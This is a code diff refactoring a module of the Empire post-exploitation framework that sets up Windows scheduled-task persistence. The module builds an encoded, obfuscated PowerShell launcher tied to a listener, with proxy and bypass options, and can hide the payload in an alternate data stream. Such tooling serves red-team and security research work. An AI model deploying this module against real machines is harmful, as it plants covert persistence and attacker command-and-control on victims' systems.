@@ -15,11 +15,7 @@ from empire.server.utils.module_util import handle_error_message
 class Module(object):
     @staticmethod
     def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
-        # Set booleans to false by default
-        obfuscate = False
 
-        listener_name = params['Listener']
-        
         # trigger options
         daily_time = params['DailyTime']
         idle_time = params['IdleTime']
@@ -34,12 +30,15 @@ class Module(object):
         cleanup = params['Cleanup']
 
         # staging options
+        listener_name = params['Listener']
         user_agent = params['UserAgent']
         proxy = params['Proxy']
         proxy_creds = params['ProxyCreds']
         if (params['Obfuscate']).lower() == 'true':
-            obfuscate = True
-        obfuscate_command = params['ObfuscateCommand']
+            launcher_obfuscate = True
+        else:
+            launcher_obfuscate = False
+        launcher_obfuscate_command = params['ObfuscateCommand']
 
         status_msg = ""
         location_string = ""
@@ -66,21 +65,18 @@ class Module(object):
 
             script += "schtasks /Delete /F /TN "+task_name+";"
             script += "'Schtasks persistence removed.'"
-            script = data_util.keyword_obfuscation(script)
-        if obfuscate:
-            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
+            script = main_menu.modules.finalize_module(script=script, script_end='', obfuscate=obfuscate, obfuscation_command=obfuscation_command)
             return script
 
         if ext_file != '':
             # read in an external file as the payload and build a 
             #   base64 encoded version as encScript
             if os.path.exists(ext_file):
-                f = open(ext_file, 'r')
-                fileData = f.read()
-                f.close()
+                with open(ext_file, 'r') as f:
+                    file_data = f.read()
 
                 # unicode-base64 encode the script for -enc launching
-                enc_script = helpers.enc_powershell(fileData)
+                enc_script = helpers.enc_powershell(file_data)
                 status_msg += "using external file " + ext_file
 
             else:
@@ -94,14 +90,18 @@ class Module(object):
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
-                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
-                                                               userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
+                launcher = main_menu.stagers.generate_launcher(listenerName=listener_name,
+                                                               language='powershell',
+                                                               encode=True,
+                                                               obfuscate=launcher_obfuscate,
+                                                               obfuscationCommand=launcher_obfuscate_command,
+                                                               userAgent=user_agent,
+                                                               proxy=proxy,
+                                                               proxyCreds=proxy_creds,
                                                                bypasses=params['Bypasses'])
                 
                 enc_script = launcher.split(" ")[-1]
                 status_msg += "using listener " + listener_name
-
 
         if ads_path != '':
             # store the script in the specified alternate data stream location
@@ -146,8 +146,5 @@ class Module(object):
 
         script += "'Schtasks persistence established "+status_msg+"'"
 
-        if main_menu.obfuscate:
-            script = data_util.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=main_menu.obfuscateCommand)
-        script = data_util.keyword_obfuscation(script)
-
+        script = main_menu.modules.finalize_module(script=script, script_end=script_end, obfuscate=obfuscate, obfuscation_command=obfuscation_command)
         return script
